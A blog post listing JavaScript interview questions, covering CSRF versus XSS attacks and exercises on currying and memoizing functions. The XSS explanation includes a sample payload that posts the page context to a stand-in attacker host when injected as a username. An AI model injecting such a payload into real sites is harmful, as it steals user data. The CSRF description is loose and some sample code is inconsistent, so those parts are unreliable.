---
layout: post
title: Interesting interview questions. Vol. 2
---

In the [previous post]() I was listing the questions from Ruby interviews I've participated in.

Now the time has passed, I've been running many interviews on my own, predominantely for JavaScript _(for both front-end and full-stack)_. And now I want to share some other interesting or tricky questions I've faced.

## CSRF vs XSS attacks

**CSRF** _(Cross-Site Request Forgery)_ is an attack when the attacker tries running a request to the target service using user's data from a valid / authenticated website. Sounds complicated, right?

To put it simply, let's imagine we have developed an API, which is capable of processing users' payments. We have also authenticated MooGames to use our API to make in-game purchases. The game developed by MooGames has user account, which it uses to track these purchases.

The idea of CSRF attack is that the hacker uses the data of the game user to access the payments API, but sends the request from his own server.

On the other hand we have **XSS** _(Cross-Site Scripting)_ attacks, which involve injecting scripts to the user data _(using inputs on a web-site - username, comments, even avatar)_ which are then injected into the code and executed, allowing attacker to run pretty much anything on behalf of the service.

Think of XSS as of SQL injection on front-end - by injecting `$.post('https://my-hack.pwn', this)` as a username, attacker can get the context of the user creation piece of logic.

## Memoizing and currying a function

```
add() // => function
add(1)() // => 1
add(1)(2)() // => 3
add(2)(2)(2)(2)() // => 8
```

```
function getDeterminant(x) {
    // make a heavy time-consuming calculation
    console.warn('Real call');

    return x * x;
}

const f = getDeterminant;
const g = memoize(getDeterminant);

f(3); // => ! Real call; 9
f(3); // => ! Real call; 9
f(3); // => ! Real call; 9

g(3); // => ! Real call; 9
g(3); // => 9
g(3); // => 9
```

The advanced case is:

```
function getSum(xs) {
    return xs.reduce((acc, x) => acc + x, 0);
}

function getLength(xs) {
    return xs.length;
}

function getAverage([ sum, length ]) {
    if (length === 0) {
        return Infinity;
    }

    return sum / length;
}

function createRange(start, end, step) {
    let res = [];

    for (let i = start; i < end; i += step) {
        res.push(i);
    }

    return res;
}

// ----------------

const range = createRange(0, 10_000_000_000, 1);

getAverage(getSum(range), getLength(range)); // => takes long time
getAverage(getSum(range), getLength(range)); // => takes long time as well

const getAverage2 = memoize([ getSum, getLength ], getAverage);

getAverage2(range);
```
